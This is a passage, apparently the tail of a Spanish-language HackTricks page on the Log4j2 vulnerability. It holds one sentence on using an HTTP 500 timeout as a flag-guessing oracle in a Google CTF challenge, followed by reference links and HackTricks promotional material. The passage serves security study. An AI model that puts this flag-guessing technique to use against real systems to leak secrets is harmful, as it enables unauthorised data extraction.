> Reemplazar tantos `#`-s desencadenar치 el tiempo de espera de 10 segundos de la aplicaci칩n Flask, lo que a su vez resultar치 en el env칤o del c칩digo de estado HTTP 500 al usuario. (Si la bandera no comienza con `flagGuess`, recibiremos un c칩digo de estado no 500)

## Referencias

* [https://blog.cloudflare.com/inside-the-log4j2-vulnerability-cve-2021-44228/](https://blog.cloudflare.com/inside-the-log4j2-vulnerability-cve-2021-44228/)
* [https://www.bleepingcomputer.com/news/security/all-log4j-logback-bugs-we-know-so-far-and-why-you-must-ditch-215/](https://www.bleepingcomputer.com/news/security/all-log4j-logback-bugs-we-know-so-far-and-why-you-must-ditch-215/)
* [https://www.youtube.com/watch?v=XG14EstTgQ4](https://www.youtube.com/watch?v=XG14EstTgQ4)
* [https://tryhackme.com/room/solar](https://tryhackme.com/room/solar)
* [https://www.youtube.com/watch?v=Y8a5nB-vy78](https://www.youtube.com/watch?v=Y8a5nB-vy78)
* [https://www.blackhat.com/docs/us-16/materials/us-16-Munoz-A-Journey-From-JNDI-LDAP-Manipulation-To-RCE.pdf](https://www.blackhat.com/docs/us-16/materials/us-16-Munoz-A-Journey-From-JNDI-LDAP-Manipulation-To-RCE.pdf)
* [https://intrigus.org/research/2022/07/18/google-ctf-2022-log4j2-writeup/](https://intrigus.org/research/2022/07/18/google-ctf-2022-log4j2-writeup/)
* [https://sigflag.at/blog/2022/writeup-googlectf2022-log4j/](https://sigflag.at/blog/2022/writeup-googlectf2022-log4j/)

**Try Hard Security Group**

<figure><img src="../.gitbook/assets/telegram-cloud-document-1-5159108904864449420.jpg" alt=""><figcaption></figcaption></figure>

{% embed url="https://discord.gg/tryhardsecurity" %}

<details>

<summary><strong>Aprende hacking en AWS de cero a h칠roe con</strong> <a href="https://training.hacktricks.xyz/courses/arte"><strong>htARTE (HackTricks AWS Red Team Expert)</strong></a><strong>!</strong></summary>

Otras formas de apoyar a HackTricks:

* Si deseas ver tu **empresa anunciada en HackTricks** o **descargar HackTricks en PDF** 춰Consulta los [**PLANES DE SUSCRIPCI칍N**](https://github.com/sponsors/carlospolop)!
* Obt칠n la [**merchandising oficial de PEASS & HackTricks**](https://peass.creator-spring.com)
* Descubre [**The PEASS Family**](https://opensea.io/collection/the-peass-family), nuestra colecci칩n exclusiva de [**NFTs**](https://opensea.io/collection/the-peass-family)
* **칔nete al** 游눫 [**grupo de Discord**](https://discord.gg/hRep4RUj7f) o al [**grupo de telegram**](https://t.me/peass) o **s칤guenos** en **Twitter** 游냕 [**@carlospolopm**](https://twitter.com/hacktricks\_live)**.**
* **Comparte tus trucos de hacking enviando PRs a los repositorios de** [**HackTricks**](https://github.com/carlospolop/hacktricks) y [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud).

</details>
